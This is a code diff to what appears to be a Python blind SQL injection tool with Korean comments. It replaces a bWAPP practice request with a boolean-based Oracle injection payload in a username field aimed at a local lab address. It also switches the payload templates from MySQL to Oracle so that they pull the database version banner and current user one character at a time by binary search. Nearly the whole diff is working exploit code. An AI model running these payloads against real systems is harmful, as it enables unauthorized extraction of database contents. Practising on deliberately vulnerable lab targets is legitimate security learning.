@@ -24,16 +24,15 @@ true_message_size = None # 참(ture)의 경우 message size
 
 
 REQUEST_STRING = """
-GET /bWAPP/sqli_1.php?title=Iron%25'+and+1=1+--+&action=search HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
-Accept-Encoding: gzip, deflate, br
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Connection: keep-alive
-Host: 192.168.0.32:8080
+GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
+Host: 192.168.219.100:5001
 Accept-Language: ko-KR,ko;q=0.9
 Upgrade-Insecure-Requests: 1
-Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
-Cookie: security_level=0; PHPSESSID=4744626a3ee715b12c0ef1226d811fdf
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
+Connection: keep-alive
 
 
 """
@@ -202,13 +201,13 @@ def setpayload():
 			payloads = {
 				'Version': {
 					'count': "",
-					'len': "(SELECT length((SELECT @@version)))>{mid_val}",
-					'version': "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"
+					'len': "(SELECT LENGTH((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%')) FROM dual)>{mid_val}",
+					'version': "ascii(substr((SELECT banner FROM V$VERSION WHERE banner LIKE 'Oracle%'),{substr_index},1))>{mid_val}"
 				},
 				'User': {
 					'count': "",
-					'len': "(SELECT length((SELECT user())))>{mid_val}",
-					'version': "ascii(substr((SELECT user()),{substr_index},1))>{mid_val}"
+					'len': "(SELECT LENGTH((SELECT user FROM dual)) FROM dual)>{mid_val}",
+					'version': "ascii(substr((SELECT USER FROM dual),{substr_index},1))>{mid_val}"
 				},
 			}
 		if args.dbs:
@@ -400,7 +399,7 @@ def query_start():
 				for key2, value2 in list(value.items())[1:]: #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
 					if key2 == 'len':
 						data_len  = recursive(0, 127, data, value2, None, rows, args.select_db, select_table_one, None)
-						# print(f"{select_table_one} 데이터 길이 : " + str(data_len))
+						print(f"[*] 데이터 길이 : " + str(data_len))
 					else:
 						name_str = ""
 						for substr_index in range(0, data_len, 1): # 데이터 글자 수 만큼 반복
